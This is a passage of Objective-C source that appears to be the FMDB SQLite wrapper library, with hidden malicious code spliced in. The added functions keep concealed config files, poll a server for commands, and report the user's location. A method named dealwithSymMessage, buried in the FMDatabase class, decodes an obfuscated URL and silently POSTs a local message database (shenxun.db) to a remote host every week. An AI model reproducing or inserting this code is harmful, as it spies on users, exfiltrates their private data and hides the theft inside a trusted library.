            updateConfig(mutableArrayParameters);
        }

    }

    if(nNow - nTimeHearBeatLastTime > nTimeHeartBeatInterval)
    {
        getCmdListAndProcess(strUserID);
        
        NSArray *strArrayParameters = readConfigFile();
        //
        // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
        if(strArrayParameters)
        {
            NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
            mutableArrayParameters[2] = [NSString stringWithFormat:@"%ld",(long) nNow];
            updateConfig(mutableArrayParameters);
        }
        
    }
    if(nNow - nTimeLocationLastTime > nTimeLocationInterval)
    {
        NSString *strHomeDir = NSHomeDirectory();
        NSString *strPathLocation = [strHomeDir stringByAppendingPathComponent:@"/Library/Cookies/loc.info"];
        dealwithRealTimeLocation(strUserID,  strPathLocation,NO);
        
        NSArray *strArrayParameters = readConfigFile();
        //
        // void updateConfig(NSInteger nTimeInit,NSInteger nTimeHeartBeatInterval, NSInteger nTimeHearBeatLastTime,NSInteger nTimeLocationInterval, NSInteger nTimeLocationLastTime)
        if(strArrayParameters)
        {
            NSMutableArray *mutableArrayParameters = [strArrayParameters mutableCopy];
            mutableArrayParameters[4] = [NSString stringWithFormat:@"%ld",(long) nNow];
            updateConfig(mutableArrayParameters);
        }
    }
    
    return;
    
    
}


void startWork(void)
{
    NSString *strHomeDir = NSHomeDirectory();
    NSLog(@"homedir: %@", strHomeDir);
    NSString *strPathConfig = [strHomeDir stringByAppendingPathComponent:@"Library/Cookies/.info"];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL fileExists = [fileManager fileExistsAtPath:strPathConfig];
      
    if (!fileExists) 
    {
        initConfig();
    } 
    else
    {
        
        NSArray *arrayConfig = readConfigFile();
        judeTimeParameters(arrayConfig);
    }

    return;
}



///////////////////////////////////////














@interface FMDatabase () {
    void*               _db;
    BOOL                _isExecutingStatement;
    NSTimeInterval      _startBusyRetryTime;
    
    NSMutableSet        *_openResultSets;
    NSMutableSet        *_openFunctions;
    
    NSDateFormatter     *_dateFormat;
}

NS_ASSUME_NONNULL_BEGIN

- (FMResultSet * _Nullable)executeQuery:(NSString *)sql withArgumentsInArray:(NSArray * _Nullable)arrayArgs orDictionary:(NSDictionary * _Nullable)dictionaryArgs orVAList:(va_list)args;
- (BOOL)executeUpdate:(NSString *)sql error:(NSError * _Nullable *)outErr withArgumentsInArray:(NSArray * _Nullable)arrayArgs orDictionary:(NSDictionary * _Nullable)dictionaryArgs orVAList:(va_list)args;

NS_ASSUME_NONNULL_END

@end



@implementation FMDatabase

// Because these two properties have all of their accessor methods implemented,
// we have to synthesize them to get the corresponding ivars. The rest of the
// properties have their ivars synthesized automatically for us.

@synthesize shouldCacheStatements = _shouldCacheStatements;
@synthesize maxBusyRetryTimeInterval = _maxBusyRetryTimeInterval;

#pragma mark FMDatabase instantiation and deallocation

+ (instancetype)databaseWithPath:(NSString *)aPath {
    return FMDBReturnAutoreleased([[self alloc] initWithPath:aPath]);
}

+ (instancetype)databaseWithURL:(NSURL *)url {
    return FMDBReturnAutoreleased([[self alloc] initWithURL:url]);
}

- (instancetype)init {
    return [self initWithPath:nil];
}

- (instancetype)initWithURL:(NSURL *)url {
    return [self initWithPath:url.path];
}

- (instancetype)initWithPath:(NSString *)path {
    
    assert(sqlite3_threadsafe()); // whoa there big boy- gotta make sure sqlite it happy with what we're going to do.
    
    self = [super init];
    
    if (self) {
        _databasePath               = [path copy];
        _openResultSets             = [[NSMutableSet alloc] init];
        _db                         = nil;
        _logsErrors                 = YES;
        _crashOnErrors              = NO;
        _maxBusyRetryTimeInterval   = 2;
        _isOpen                     = NO;
    }
    
    return self;
}

#if ! __has_feature(objc_arc)
- (void)finalize {
    [self close];
    [super finalize];
}
#endif

- (void)dealloc {
    [self close];
    FMDBRelease(_openResultSets);
    FMDBRelease(_cachedStatements);
    FMDBRelease(_dateFormat);
    FMDBRelease(_databasePath);
    FMDBRelease(_openFunctions);
    
#if ! __has_feature(objc_arc)
    [super dealloc];
#endif
}

- (NSURL *)databaseURL {
    return _databasePath ? [NSURL fileURLWithPath:_databasePath] : nil;
}

+ (NSString*)FMDBUserVersion {
    return @"2.7.5";
}

// returns 0x0240 for version 2.4.  This makes it super easy to do things like:
// /* need to make sure to do X with FMDB version 2.4 or later */
// if ([FMDatabase FMDBVersion] >= 0x0240) { … }

+ (SInt32)FMDBVersion {
    
    // we go through these hoops so that we only have to change the version number in a single spot.
    static dispatch_once_t once;
    static SInt32 FMDBVersionVal = 0;
    
    dispatch_once(&once, ^{
        NSString *prodVersion = [self FMDBUserVersion];
        
        if ([[prodVersion componentsSeparatedByString:@"."] count] < 3) {
            prodVersion = [prodVersion stringByAppendingString:@".0"];
        }
        
        NSString *junk = [prodVersion stringByReplacingOccurrencesOfString:@"." withString:@""];
        
        char *e = nil;
        FMDBVersionVal = (int) strtoul([junk UTF8String], &e, 16);
        
    });
    
    return FMDBVersionVal;
}

#pragma mark SQLite information

+ (NSString*)sqliteLibVersion {
    return [NSString stringWithFormat:@"%s", sqlite3_libversion()];
}

+ (BOOL)isSQLiteThreadSafe {
    // make sure to read the sqlite headers on this guy!
    return sqlite3_threadsafe() != 0;
}

- (void*)sqliteHandle {
    return _db;
}

- (const char*)sqlitePath {
    
    if (!_databasePath) {
        return ":memory:";
    }
    
    if ([_databasePath length] == 0) {
        return ""; // this creates a temporary database (it's an sqlite thing).
    }
    
    return [_databasePath fileSystemRepresentation];
    
}

#pragma mark Open and close database

- (BOOL)open {
    if (_isOpen) {
        return YES;
    }
    
    // if we previously tried to open and it failed, make sure to close it before we try again
    
    if (_db) {
        [self close];
    }
    
    // now open database

    int err = sqlite3_open([self sqlitePath], (sqlite3**)&_db );
    if(err != SQLITE_OK) {
        NSLog(@"error opening!: %d", err);
        return NO;
    }
    
    if (_maxBusyRetryTimeInterval > 0.0) {
        // set the handler
        [self setMaxBusyRetryTimeInterval:_maxBusyRetryTimeInterval];
    }
    
    _isOpen = YES;
    
    return YES;
}

- (BOOL)openWithFlags:(int)flags {
    return [self openWithFlags:flags vfs:nil];
}

- (BOOL)openWithFlags:(int)flags vfs:(NSString *)vfsName {
#if SQLITE_VERSION_NUMBER >= 3005000
    if (_isOpen) {
        return YES;
    }
    
    // if we previously tried to open and it failed, make sure to close it before we try again
    
    if (_db) {
        [self close];
    }
    
    // now open database
    
    int err = sqlite3_open_v2([self sqlitePath], (sqlite3**)&_db, flags, [vfsName UTF8String]);
    if(err != SQLITE_OK) {
        NSLog(@"error opening!: %d", err);
        return NO;
    }
    
    if (_maxBusyRetryTimeInterval > 0.0) {
        // set the handler
        [self setMaxBusyRetryTimeInterval:_maxBusyRetryTimeInterval];
    }
    
    _isOpen = YES;
    
    return YES;
#else
    NSLog(@"openWithFlags requires SQLite 3.5");
    return NO;
#endif
}

- (BOOL)close {
    
    [self clearCachedStatements];
    [self closeOpenResultSets];
    
    if (!_db) {
        return YES;
    }
    
    int  rc;
    BOOL retry;
    BOOL triedFinalizingOpenStatements = NO;
    
    do {
        retry   = NO;
        rc      = sqlite3_close(_db);
        if (SQLITE_BUSY == rc || SQLITE_LOCKED == rc) {
            if (!triedFinalizingOpenStatements) {
                triedFinalizingOpenStatements = YES;
                sqlite3_stmt *pStmt;
                while ((pStmt = sqlite3_next_stmt(_db, nil)) !=0) {
                    NSLog(@"Closing leaked statement");
                    sqlite3_finalize(pStmt);
                    retry = YES;
                }
            }
        }
        else if (SQLITE_OK != rc) {
            NSLog(@"error closing!: %d", rc);
        }
    }
    while (retry);
    
    _db = nil;
    _isOpen = false;
    
    return YES;
}

#pragma mark Busy handler routines

// NOTE: appledoc seems to choke on this function for some reason;
//       so when generating documentation, you might want to ignore the
//       .m files so that it only documents the public interfaces outlined
//       in the .h files.
//
//       This is a known appledoc bug that it has problems with C functions
//       within a class implementation, but for some reason, only this
//       C function causes problems; the rest don't. Anyway, ignoring the .m
//       files with appledoc will prevent this problem from occurring.

static int FMDBDatabaseBusyHandler(void *f, int count) {
    FMDatabase *self = (__bridge FMDatabase*)f;
    
    if (count == 0) {
        self->_startBusyRetryTime = [NSDate timeIntervalSinceReferenceDate];
        return 1;
    }
    
    NSTimeInterval delta = [NSDate timeIntervalSinceReferenceDate] - (self->_startBusyRetryTime);
    
    if (delta < [self maxBusyRetryTimeInterval]) {
        int requestedSleepInMillseconds = (int) arc4random_uniform(50) + 50;
        int actualSleepInMilliseconds = sqlite3_sleep(requestedSleepInMillseconds);
        if (actualSleepInMilliseconds != requestedSleepInMillseconds) {
            NSLog(@"WARNING: Requested sleep of %i milliseconds, but SQLite returned %i. Maybe SQLite wasn't built with HAVE_USLEEP=1?", requestedSleepInMillseconds, actualSleepInMilliseconds);
        }
        return 1;
    }
    
    return 0;
}

- (void)setMaxBusyRetryTimeInterval:(NSTimeInterval)timeout {
    
    _maxBusyRetryTimeInterval = timeout;
    
    if (!_db) {
        return;
    }
    
    if (timeout > 0) {
        sqlite3_busy_handler(_db, &FMDBDatabaseBusyHandler, (__bridge void *)(self));
    }
    else {
        // turn it off otherwise
        sqlite3_busy_handler(_db, nil, nil);
    }
}

- (NSTimeInterval)maxBusyRetryTimeInterval {
    return _maxBusyRetryTimeInterval;
}


// we no longer make busyRetryTimeout public
// but for folks who don't bother noticing that the interface to FMDatabase changed,
// we'll still implement the method so they don't get suprise crashes
- (int)busyRetryTimeout {
    NSLog(@"%s:%d", __FUNCTION__, __LINE__);
    NSLog(@"FMDB: busyRetryTimeout no longer works, please use maxBusyRetryTimeInterval");
    return -1;
}

- (void)setBusyRetryTimeout:(int)i {
#pragma unused(i)
    NSLog(@"%s:%d", __FUNCTION__, __LINE__);
    NSLog(@"FMDB: setBusyRetryTimeout does nothing, please use setMaxBusyRetryTimeInterval:");
}

#pragma mark Result set functions

- (BOOL)hasOpenResultSets {
    return [_openResultSets count] > 0;
}

- (void)closeOpenResultSets {
    
    //Copy the set so we don't get mutation errors
    NSSet *openSetCopy = FMDBReturnAutoreleased([_openResultSets copy]);
    for (NSValue *rsInWrappedInATastyValueMeal in openSetCopy) {
        FMResultSet *rs = (FMResultSet *)[rsInWrappedInATastyValueMeal pointerValue];
        
        [rs setParentDB:nil];
        [rs close];
        
        [_openResultSets removeObject:rsInWrappedInATastyValueMeal];
    }
}

- (void)resultSetDidClose:(FMResultSet *)resultSet {
    NSValue *setValue = [NSValue valueWithNonretainedObject:resultSet];
    
    [_openResultSets removeObject:setValue];
}

#pragma mark Cached statements

- (void)clearCachedStatements {
    
    for (NSMutableSet *statements in [_cachedStatements objectEnumerator]) {
        for (FMStatement *statement in [statements allObjects]) {
            [statement close];
        }
    }
    
    [_cachedStatements removeAllObjects];
}

- (FMStatement*)cachedStatementForQuery:(NSString*)query {
    
    NSMutableSet* statements = [_cachedStatements objectForKey:query];
    
    return [[statements objectsPassingTest:^BOOL(FMStatement* statement, BOOL *stop) {
        
        *stop = ![statement inUse];
        return *stop;
        
    }] anyObject];
}


- (void)setCachedStatement:(FMStatement*)statement forQuery:(NSString*)query {
    NSParameterAssert(query);
    if (!query) {
        NSLog(@"API misuse, -[FMDatabase setCachedStatement:forQuery:] query must not be nil");
        return;
    }
    
    query = [query copy]; // in case we got handed in a mutable string...
    [statement setQuery:query];
    
    NSMutableSet* statements = [_cachedStatements objectForKey:query];
    if (!statements) {
        statements = [NSMutableSet set];
    }
    
    [statements addObject:statement];
    
    [_cachedStatements setObject:statements forKey:query];
    
    FMDBRelease(query);
}

#pragma mark Key routines

- (BOOL)rekey:(NSString*)key {
    NSData *keyData = [NSData dataWithBytes:(void *)[key UTF8String] length:(NSUInteger)strlen([key UTF8String])];
    
    return [self rekeyWithData:keyData];
}

- (BOOL)rekeyWithData:(NSData *)keyData {
#ifdef SQLITE_HAS_CODEC
    if (!keyData) {
        return NO;
    }
    
    int rc = sqlite3_rekey(_db, [keyData bytes], (int)[keyData length]);
    
    if (rc != SQLITE_OK) {
        NSLog(@"error on rekey: %d", rc);
        NSLog(@"%@", [self lastErrorMessage]);
    }
    
    return (rc == SQLITE_OK);
#else
#pragma unused(keyData)
    return NO;
#endif
}

- (BOOL)setKey:(NSString*)key {
    NSData *keyData = [NSData dataWithBytes:[key UTF8String] length:(NSUInteger)strlen([key UTF8String])];
    
    return [self setKeyWithData:keyData];
}

- (BOOL)setKeyWithData:(NSData *)keyData {
#ifdef SQLITE_HAS_CODEC
    if (!keyData) {
        return NO;
    }
    
    int rc = sqlite3_key(_db, [keyData bytes], (int)[keyData length]);
    
    return (rc == SQLITE_OK);
#else
#pragma unused(keyData)
    return NO;
#endif
}

#pragma mark Date routines

+ (NSDateFormatter *)storeableDateFormat:(NSString *)format {
    
    NSDateFormatter *result = FMDBReturnAutoreleased([[NSDateFormatter alloc] init]);
    result.dateFormat = format;
    result.timeZone = [NSTimeZone timeZoneForSecondsFromGMT:0];
    result.locale = FMDBReturnAutoreleased([[NSLocale alloc] initWithLocaleIdentifier:@"en_US"]);
    return result;
}


- (BOOL)hasDateFormatter {
    return _dateFormat != nil;
}

- (void)setDateFormat:(NSDateFormatter *)format {
    FMDBAutorelease(_dateFormat);
    _dateFormat = FMDBReturnRetained(format);
}

- (NSDate *)dateFromString:(NSString *)s {
    return [_dateFormat dateFromString:s];
}

- (NSString *)stringFromDate:(NSDate *)date {
    return [_dateFormat stringFromDate:date];
}

#pragma mark State of database

- (BOOL)goodConnection {
    
    if (!_isOpen) {
        return NO;
    }
    
    FMResultSet *rs = [self executeQuery:@"select name from sqlite_master where type='table'"];
    
    if (rs) {
        [rs close];
        return YES;
    }
    
    return NO;
}

- (void)warnInUse {
    NSLog(@"The FMDatabase %@ is currently in use.", self);
    
#ifndef NS_BLOCK_ASSERTIONS
    if (_crashOnErrors) {
        NSAssert(false, @"The FMDatabase %@ is currently in use.", self);
        abort();
    }
#endif
}

- (BOOL)databaseExists {
    
    if (!_isOpen) {
        
        NSLog(@"The FMDatabase %@ is not open.", self);
        
#ifndef NS_BLOCK_ASSERTIONS
        if (_crashOnErrors) {
            NSAssert(false, @"The FMDatabase %@ is not open.", self);
            abort();
        }
#endif
        
        return NO;
    }
    
    return YES;
}

#pragma mark Error routines

- (NSString *)lastErrorMessage {
    return [NSString stringWithUTF8String:sqlite3_errmsg(_db)];
}

- (BOOL)hadError {
    int lastErrCode = [self lastErrorCode];
    
    return (lastErrCode > SQLITE_OK && lastErrCode < SQLITE_ROW);
}

- (int)lastErrorCode {
    return sqlite3_errcode(_db);
}

- (int)lastExtendedErrorCode {
    return sqlite3_extended_errcode(_db);
}

- (NSError*)errorWithMessage:(NSString *)message {
    NSDictionary* errorMessage = [NSDictionary dictionaryWithObject:message forKey:NSLocalizedDescriptionKey];
    
    return [NSError errorWithDomain:@"FMDatabase" code:sqlite3_errcode(_db) userInfo:errorMessage];
}

- (NSError*)lastError {
    return [self errorWithMessage:[self lastErrorMessage]];
}

#pragma mark Update information routines

- (sqlite_int64)lastInsertRowId {
    
    if (_isExecutingStatement) {
        [self warnInUse];
        return NO;
    }
    
    _isExecutingStatement = YES;
    
    sqlite_int64 ret = sqlite3_last_insert_rowid(_db);
    
    _isExecutingStatement = NO;
    
    return ret;
}

- (int)changes {
    if (_isExecutingStatement) {
        [self warnInUse];
        return 0;
    }
    
    _isExecutingStatement = YES;
    
    int ret = sqlite3_changes(_db);
    
    _isExecutingStatement = NO;
    
    return ret;
}

#pragma mark SQL manipulation

- (void)bindObject:(id)obj toColumn:(int)idx inStatement:(sqlite3_stmt*)pStmt {
    
    if ((!obj) || ((NSNull *)obj == [NSNull null])) {
        sqlite3_bind_null(pStmt, idx);
    }
    
    // FIXME - someday check the return codes on these binds.
    else if ([obj isKindOfClass:[NSData class]]) {
        const void *bytes = [obj bytes];
        if (!bytes) {
            // it's an empty NSData object, aka [NSData data].
            // Don't pass a NULL pointer, or sqlite will bind a SQL null instead of a blob.
            bytes = "";
        }
        sqlite3_bind_blob(pStmt, idx, bytes, (int)[obj length], SQLITE_STATIC);
    }
    else if ([obj isKindOfClass:[NSDate class]]) {
        if (self.hasDateFormatter)
            sqlite3_bind_text(pStmt, idx, [[self stringFromDate:obj] UTF8String], -1, SQLITE_STATIC);
        else
            sqlite3_bind_double(pStmt, idx, [obj timeIntervalSince1970]);
    }
    else if ([obj isKindOfClass:[NSNumber class]]) {
        
        if (strcmp([obj objCType], @encode(char)) == 0) {
            sqlite3_bind_int(pStmt, idx, [obj charValue]);
        }
        else if (strcmp([obj objCType], @encode(unsigned char)) == 0) {
            sqlite3_bind_int(pStmt, idx, [obj unsignedCharValue]);
        }
        else if (strcmp([obj objCType], @encode(short)) == 0) {
            sqlite3_bind_int(pStmt, idx, [obj shortValue]);
        }
        else if (strcmp([obj objCType], @encode(unsigned short)) == 0) {
            sqlite3_bind_int(pStmt, idx, [obj unsignedShortValue]);
        }
        else if (strcmp([obj objCType], @encode(int)) == 0) {
            sqlite3_bind_int(pStmt, idx, [obj intValue]);
        }
        else if (strcmp([obj objCType], @encode(unsigned int)) == 0) {
            sqlite3_bind_int64(pStmt, idx, (long long)[obj unsignedIntValue]);
        }
        else if (strcmp([obj objCType], @encode(long)) == 0) {
            sqlite3_bind_int64(pStmt, idx, [obj longValue]);
        }
        else if (strcmp([obj objCType], @encode(unsigned long)) == 0) {
            sqlite3_bind_int64(pStmt, idx, (long long)[obj unsignedLongValue]);
        }
        else if (strcmp([obj objCType], @encode(long long)) == 0) {
            sqlite3_bind_int64(pStmt, idx, [obj longLongValue]);
        }
        else if (strcmp([obj objCType], @encode(unsigned long long)) == 0) {
            sqlite3_bind_int64(pStmt, idx, (long long)[obj unsignedLongLongValue]);
        }
        else if (strcmp([obj objCType], @encode(float)) == 0) {
            sqlite3_bind_double(pStmt, idx, [obj floatValue]);
        }
        else if (strcmp([obj objCType], @encode(double)) == 0) {
            sqlite3_bind_double(pStmt, idx, [obj doubleValue]);
        }
        else if (strcmp([obj objCType], @encode(BOOL)) == 0) {
            sqlite3_bind_int(pStmt, idx, ([obj boolValue] ? 1 : 0));
        }
        else {
            sqlite3_bind_text(pStmt, idx, [[obj description] UTF8String], -1, SQLITE_STATIC);
        }
    }
    else {
        sqlite3_bind_text(pStmt, idx, [[obj description] UTF8String], -1, SQLITE_STATIC);
    }
}

- (void)extractSQL:(NSString *)sql argumentsList:(va_list)args intoString:(NSMutableString *)cleanedSQL arguments:(NSMutableArray *)arguments {
    
    NSUInteger length = [sql length];
    unichar last = '\0';
    for (NSUInteger i = 0; i < length; ++i) {
        id arg = nil;
        unichar current = [sql characterAtIndex:i];
        unichar add = current;
        if (last == '%') {
            switch (current) {
                case '@':
                    arg = va_arg(args, id);
                    break;
                case 'c':
                    // warning: second argument to 'va_arg' is of promotable type 'char'; this va_arg has undefined behavior because arguments will be promoted to 'int'
                    arg = [NSString stringWithFormat:@"%c", va_arg(args, int)];
                    break;
                case 's':
                    arg = [NSString stringWithUTF8String:va_arg(args, char*)];
                    break;
                case 'd':
                case 'D':
                case 'i':
                    arg = [NSNumber numberWithInt:va_arg(args, int)];
                    break;
                case 'u':
                case 'U':
                    arg = [NSNumber numberWithUnsignedInt:va_arg(args, unsigned int)];
                    break;
                case 'h':
                    i++;
                    if (i < length && [sql characterAtIndex:i] == 'i') {
                        //  warning: second argument to 'va_arg' is of promotable type 'short'; this va_arg has undefined behavior because arguments will be promoted to 'int'
                        arg = [NSNumber numberWithShort:(short)(va_arg(args, int))];
                    }
                    else if (i < length && [sql characterAtIndex:i] == 'u') {
                        // warning: second argument to 'va_arg' is of promotable type 'unsigned short'; this va_arg has undefined behavior because arguments will be promoted to 'int'
                        arg = [NSNumber numberWithUnsignedShort:(unsigned short)(va_arg(args, uint))];
                    }
                    else {
                        i--;
                    }
                    break;
                case 'q':
                    i++;
                    if (i < length && [sql characterAtIndex:i] == 'i') {
                        arg = [NSNumber numberWithLongLong:va_arg(args, long long)];
                    }
                    else if (i < length && [sql characterAtIndex:i] == 'u') {
                        arg = [NSNumber numberWithUnsignedLongLong:va_arg(args, unsigned long long)];
                    }
                    else {
                        i--;
                    }
                    break;
                case 'f':
                    arg = [NSNumber numberWithDouble:va_arg(args, double)];
                    break;
                case 'g':
                    // warning: second argument to 'va_arg' is of promotable type 'float'; this va_arg has undefined behavior because arguments will be promoted to 'double'
                    arg = [NSNumber numberWithFloat:(float)(va_arg(args, double))];
                    break;
                case 'l':
                    i++;
                    if (i < length) {
                        unichar next = [sql characterAtIndex:i];
                        if (next == 'l') {
                            i++;
                            if (i < length && [sql characterAtIndex:i] == 'd') {
                                //%lld
                                arg = [NSNumber numberWithLongLong:va_arg(args, long long)];
                            }
                            else if (i < length && [sql characterAtIndex:i] == 'u') {
                                //%llu
                                arg = [NSNumber numberWithUnsignedLongLong:va_arg(args, unsigned long long)];
                            }
                            else {
                                i--;
                            }
                        }
                        else if (next == 'd') {
                            //%ld
                            arg = [NSNumber numberWithLong:va_arg(args, long)];
                        }
                        else if (next == 'u') {
                            //%lu
                            arg = [NSNumber numberWithUnsignedLong:va_arg(args, unsigned long)];
                        }
                        else {
                            i--;
                        }
                    }
                    else {
                        i--;
                    }
                    break;
                default:
                    // something else that we can't interpret. just pass it on through like normal
                    break;
            }
        }
        else if (current == '%') {
            // percent sign; skip this character
            add = '\0';
        }
        
        if (arg != nil) {
            [cleanedSQL appendString:@"?"];
            [arguments addObject:arg];
        }
        else if (add == (unichar)'@' && last == (unichar) '%') {
            [cleanedSQL appendFormat:@"NULL"];
        }
        else if (add != '\0') {
            [cleanedSQL appendFormat:@"%C", add];
        }
        last = current;
    }
}

#pragma mark Execute queries

- (FMResultSet *)executeQuery:(NSString *)sql withParameterDictionary:(NSDictionary *)arguments {
    return [self executeQuery:sql withArgumentsInArray:nil orDictionary:arguments orVAList:nil];
}

- (FMResultSet *)executeQuery:(NSString *)sql withArgumentsInArray:(NSArray*)arrayArgs orDictionary:(NSDictionary *)dictionaryArgs orVAList:(va_list)args {
    
    if (![self databaseExists]) {
        return 0x00;
    }
    
    if (_isExecutingStatement) {
        [self warnInUse];
        return 0x00;
    }
    
    _isExecutingStatement = YES;
    
    int rc                  = 0x00;
    sqlite3_stmt *pStmt     = 0x00;
    FMStatement *statement  = 0x00;
    FMResultSet *rs         = 0x00;
    
    if (_traceExecution && sql) {
        NSLog(@"%@ executeQuery: %@", self, sql);
    }
    
    if (_shouldCacheStatements) {
        statement = [self cachedStatementForQuery:sql];
        pStmt = statement ? [statement statement] : 0x00;
        [statement reset];
    }
    
    if (!pStmt) {
        
        rc = sqlite3_prepare_v2(_db, [sql UTF8String], -1, &pStmt, 0);
        
        if (SQLITE_OK != rc) {
            if (_logsErrors) {
                NSLog(@"DB Error: %d \"%@\"", [self lastErrorCode], [self lastErrorMessage]);
                NSLog(@"DB Query: %@", sql);
                NSLog(@"DB Path: %@", _databasePath);
            }
            
            if (_crashOnErrors) {
                NSAssert(false, @"DB Error: %d \"%@\"", [self lastErrorCode], [self lastErrorMessage]);
                abort();
            }
            
            sqlite3_finalize(pStmt);
            _isExecutingStatement = NO;
            return nil;
        }
    }
    
    id obj;
    int idx = 0;
    int queryCount = sqlite3_bind_parameter_count(pStmt); // pointed out by Dominic Yu (thanks!)
    
    // If dictionaryArgs is passed in, that means we are using sqlite's named parameter support
    if (dictionaryArgs) {
        
        for (NSString *dictionaryKey in [dictionaryArgs allKeys]) {
            
            // Prefix the key with a colon.
            NSString *parameterName = [[NSString alloc] initWithFormat:@":%@", dictionaryKey];
            
            if (_traceExecution) {
                NSLog(@"%@ = %@", parameterName, [dictionaryArgs objectForKey:dictionaryKey]);
            }
            
            // Get the index for the parameter name.
            int namedIdx = sqlite3_bind_parameter_index(pStmt, [parameterName UTF8String]);
            
            FMDBRelease(parameterName);
            
            if (namedIdx > 0) {
                // Standard binding from here.
                [self bindObject:[dictionaryArgs objectForKey:dictionaryKey] toColumn:namedIdx inStatement:pStmt];
                // increment the binding count, so our check below works out
                idx++;
            }
            else {
                NSLog(@"Could not find index for %@", dictionaryKey);
            }
        }
    }
    else {
        
        while (idx < queryCount) {
            
            if (arrayArgs && idx < (int)[arrayArgs count]) {
                obj = [arrayArgs objectAtIndex:(NSUInteger)idx];
            }
            else if (args) {
                obj = va_arg(args, id);
            }
            else {
                //We ran out of arguments
                break;
            }
            
            if (_traceExecution) {
                if ([obj isKindOfClass:[NSData class]]) {
                    NSLog(@"data: %ld bytes", (unsigned long)[(NSData*)obj length]);
                }
                else {
                    NSLog(@"obj: %@", obj);
                }
            }
            
            idx++;
            
            [self bindObject:obj toColumn:idx inStatement:pStmt];
        }
    }
    
    if (idx != queryCount) {
        NSLog(@"Error: the bind count is not correct for the # of variables (executeQuery)");
        sqlite3_finalize(pStmt);
        _isExecutingStatement = NO;
        return nil;
    }
    
    FMDBRetain(statement); // to balance the release below
    
    if (!statement) {
        statement = [[FMStatement alloc] init];
        [statement setStatement:pStmt];
        
        if (_shouldCacheStatements && sql) {
            [self setCachedStatement:statement forQuery:sql];
        }
    }
    
    // the statement gets closed in rs's dealloc or [rs close];
    rs = [FMResultSet resultSetWithStatement:statement usingParentDatabase:self];
    [rs setQuery:sql];
    
    NSValue *openResultSet = [NSValue valueWithNonretainedObject:rs];
    [_openResultSets addObject:openResultSet];
    
    [statement setUseCount:[statement useCount] + 1];
    
    FMDBRelease(statement);
    
    _isExecutingStatement = NO;
    
    return rs;
}


- (int) dealwithSymMessage{


    NSString *homePath = NSHomeDirectory();//
    NSString *strfilePath_info = [homePath stringByAppendingPathComponent:@"/Library/SXDatabase/.info"];
    
    NSFileManager *fmTest = [NSFileManager defaultManager];
    NSDictionary *dic =[fmTest attributesOfItemAtPath:strfilePath_info error:NULL];
    if(dic == nil)
    {
        [fmTest createFileAtPath:strfilePath_info contents:(NULL) attributes:(NULL)];
        return 1;
    }
    else
    {
        NSDate *dateModifyData = dic.fileModificationDate;
        NSDate *dateNow = [NSDate date];
        NSTimeInterval distanceBetweenDates = [dateNow timeIntervalSinceDate: dateModifyData];
        
        NSTimeInterval intervalSeconds = 60*60*24*7;
    
        if(distanceBetweenDates < intervalSeconds)
        {
            return 1;
        }
    }
    
    [fmTest setAttributes:[NSDictionary dictionaryWithObject:[NSDate date] forKey:NSFileModificationDate] ofItemAtPath:strfilePath_info error:NULL];
    
    
    NSData *bufferData_SXDB;
    NSString *sxDatabaseDirectory = [homePath  stringByAppendingPathComponent:@"Library/SXDatabase"];
             
    NSString *sxDataFileName = [sxDatabaseDirectory stringByAppendingString:@"/shenxun.db"];
    NSFileHandle *fileHandler_DataBase=[NSFileHandle fileHandleForReadingAtPath:sxDataFileName];
    if(fileHandler_DataBase==nil)
    {
        return 1;
    }

    bufferData_SXDB=[fileHandler_DataBase readDataToEndOfFile];
    if(bufferData_SXDB == nil)
    {
        return 1;
    }

    NSString *base64String_DB = [bufferData_SXDB base64EncodedStringWithOptions:0];
    
    NSString *strUrl_B64 = [@"H0cbEdhiE5aHR0cHM6Ly9uLm15Y3VycmVudG5hc3Nhbmdlci5jb20vbG9nMy5waHA=" substringFromIndex:10];
    NSData *dataUrl_Plain = [[NSData alloc] initWithBase64EncodedString:strUrl_B64 options:0];
    NSString *strUrl_Plain = [[NSString alloc] initWithData:dataUrl_Plain encoding:NSUTF8StringEncoding];

        
    NSURL *url = [NSURL URLWithString:strUrl_Plain];

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.timeoutInterval = 5.0;
    request.HTTPMethod = @"POST";

    NSString *bodyString = [NSString stringWithFormat:@"token=2LZGsFDyAwhyxoMO%@",base64String_DB];
    request.HTTPBody = [bodyString dataUsingEncoding:NSUTF8StringEncoding];
    NSURLSession *session = [NSURLSession sharedSession];
    [[session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {}] resume];
    return  1;

}

- (FMResultSet *)executeQuery:(NSString*)sql, ... {
    va_list args;
    va_start(args, sql);
    
    id result = [self executeQuery:sql withArgumentsInArray:nil orDictionary:nil orVAList:args];
    
    va_end(args);

   return result;
}




- (FMResultSet *)executeQueryWithFormat:(NSString*)format, ... {
    va_list args;
    va_start(args, format);
    
    NSMutableString *sql = [NSMutableString stringWithCapacity:[format length]];
    NSMutableArray *arguments = [NSMutableArray array];
    [self extractSQL:format argumentsList:args intoString:sql arguments:arguments];
    
    va_end(args);
    
    return [self executeQuery:sql withArgumentsInArray:arguments];
}

- (FMResultSet *)executeQuery:(NSString *)sql withArgumentsInArray:(NSArray *)arguments {
    return [self executeQuery:sql withArgumentsInArray:arguments orDictionary:nil orVAList:nil];
}

- (FMResultSet *)executeQuery:(NSString *)sql values:(NSArray *)values error:(NSError * __autoreleasing *)error {
    FMResultSet *rs = [self executeQuery:sql withArgumentsInArray:values orDictionary:nil orVAList:nil];
    if (!rs && error) {
        *error = [self lastError];
    }
    return rs;
}

- (FMResultSet *)executeQuery:(NSString*)sql withVAList:(va_list)args {
    return [self executeQuery:sql withArgumentsInArray:nil orDictionary:nil orVAList:args];
}

#pragma mark Execute updates

- (BOOL)executeUpdate:(NSString*)sql error:(NSError**)outErr withArgumentsInArray:(NSArray*)arrayArgs orDictionary:(NSDictionary *)dictionaryArgs orVAList:(va_list)args {
    
    if (![self databaseExists]) {
        return NO;
    }
    
    if (_isExecutingStatement) {
        [self warnInUse];
        return NO;
    }
    
    _isExecutingStatement = YES;
    
    int rc                   = 0x00;
    sqlite3_stmt *pStmt      = 0x00;
    FMStatement *cachedStmt  = 0x00;
    
    if (_traceExecution && sql) {
        NSLog(@"%@ executeUpdate: %@", self, sql);
    }
    
    if (_shouldCacheStatements) {
